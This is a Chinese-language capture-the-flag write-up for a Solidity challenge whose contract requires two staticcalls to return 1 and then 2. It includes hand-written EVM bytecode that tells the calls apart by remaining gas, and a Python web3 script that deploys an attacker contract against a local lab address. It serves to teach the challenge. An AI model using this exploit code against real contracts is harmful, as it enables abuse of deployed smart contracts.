# static

## 源码

```js
pragma solidity =0.8.12;

contract Challenge {
    uint constant fee = 100000;
    uint constant max_code_size = 0x80;

    event SendFlag(address);

    function solve() public {
        uint answer;
        bool success;
        bytes memory result;

        assembly {
            answer := extcodesize(caller())
        }
        require(answer < max_code_size);

        (success, result) = msg.sender.staticcall{gas:fee}("");
        answer = uint(bytes32(result));
        require(success && answer == 1);

        (success, result) = msg.sender.staticcall{gas:fee}("");
        answer = uint(bytes32(result));
        require(success && answer == 2);

        emit SendFlag(msg.sender);
    }
}
```

## 题解

出题人题解：[HF2022-vdq-mva-fpbe-static/README.md at main · Ainevsia/HF2022-vdq-mva-fpbe-static · GitHub](https://github.com/Ainevsia/HF2022-vdq-mva-fpbe-static/blob/main/static/README.md)

两次staticcall，第一次返回1，第二次返回2

可以根据gas的情况来判断，第一次满fee 100000进入，返回1，第二次不满100000，返回2

extcodesize(caller())<0x80 肯定是要手写字节码了，只能看着官方wp复现

```
    gas	//获取执行完该字节码后的gas余量，这一步消耗2gas，因此下面是100000-2=99998
    push3 0x01869e	//99998
    calldatasize
    push1 0
    lt		//根据calldata的大小判断是否是来自题目合约的staticcall
    push __attack__
    jumpi
    eq	//gas == 99998
    push __1__
    jumpi
    push1 2
    push __return__
    jump
__1__:
    jumpdest
    push1 1
    push __return__
    jump
__return__:
    jumpdest
    push1 0
    mstore
    push1 0x20
    push1 0
    return
__attack__:		//攻击函数
    jumpdest
    push1 0
    push4 0x890d6908	//题目合约的solve()函数选择器
    dup2
    mstore
    dup1
    push1 4
    push1 28	//从高位32位开始存储，因此0x890d6908存在了28~32的位置
    dup3
    push20  0x776d11797734b0529C7eaEAc9c95057A258fA5d0
    push3 0x019000	//传入的gas，这里需要多次尝试，直到满足第一次满100000gas，第二次不满，复现环境中是102400
    call
    push1 1
    eq	//判断调用结果是否成功
    push __graceful__
    jumpi
    revert
__graceful__:
    jumpdest
    stop
```

python脚本的话直接抄一下出题人的

```python
from web3 import Web3
import requests, time

SERVER_IP  = '192.168.21.128'    # change this
GETH_PORT  = '8545'
FAUCET_PORT = '8080'
victim = '0x776d11797734b0529C7eaEAc9c95057A258fA5d0'   # just change this to target address

w3 = Web3(Web3.HTTPProvider(f'http://{SERVER_IP}:{GETH_PORT}')) 
assert w3.isConnected()

acc = w3.eth.account.create()
hacker, sk_hacker = acc.address, acc.key
MIN_GAS = '019000'

print('[+] hacker:', hacker)
assert requests.post(f'http://{SERVER_IP}:{FAUCET_PORT}/api/claim', data = {'address': hacker}).status_code == 200
print('[+] waiting for test ether')
while w3.eth.get_balance(hacker) == 0:
    time.sleep(5)
print('[+] exploit start')

def get_txn(src, dst, data, value=0):
    return {
        "chainId": w3.eth.chain_id,
        "from": src,
        "to": dst,
        "gasPrice": w3.toWei(1,'gwei'),	# 这里出题人的脚本有点坑，原本是1 wei，根本上不了链，改成gwei就好了
        "gas": 4700000,
        "value": w3.toWei(value,'ether'),
        "nonce": w3.eth.getTransactionCount(src),
        "data": data
    }

def deploy(src, data, value=0):
    return {
        "chainId": w3.eth.chain_id,
        "from": src,
        "gasPrice": w3.toWei(1,'gwei'),
        "gas": 4700000,
        "value": w3.toWei(value,'ether'),
        "nonce": w3.eth.getTransactionCount(src),
        "data": data
    }

bytecode = '6080604052348015600f57600080fd5b5060006040518060800160405280605781526020016035605791399050805160208201f3fe5a6201869e36600010602457146015576002601b565b6001601b565b60005260206000f35b600063890d69088152806004601c8273'
bytecode += victim[2:]
bytecode += f'62{MIN_GAS}f1600114605557fd5b00'

signed_txn = w3.eth.account.signTransaction(deploy(hacker, bytecode), sk_hacker)
print(signed_txn)
txn_hash = w3.eth.sendRawTransaction(signed_txn.rawTransaction).hex()
txn_receipt = w3.eth.waitForTransactionReceipt(txn_hash)
assert txn_receipt['status'] == 1
target = txn_receipt['contractAddress']
print('[+] attacker address:', target)

data = b'\x11'	# calldata带点数据，触发__attack__攻击函数
signed_txn = w3.eth.account.signTransaction(get_txn(hacker, target, data), sk_hacker)
txn_hash = w3.eth.sendRawTransaction(signed_txn.rawTransaction).hex()
txn_receipt = w3.eth.waitForTransactionReceipt(txn_hash)
assert txn_receipt['status'] == 1
print('[+] exploited, tx_hash:', txn_receipt['transactionHash'].hex())
```

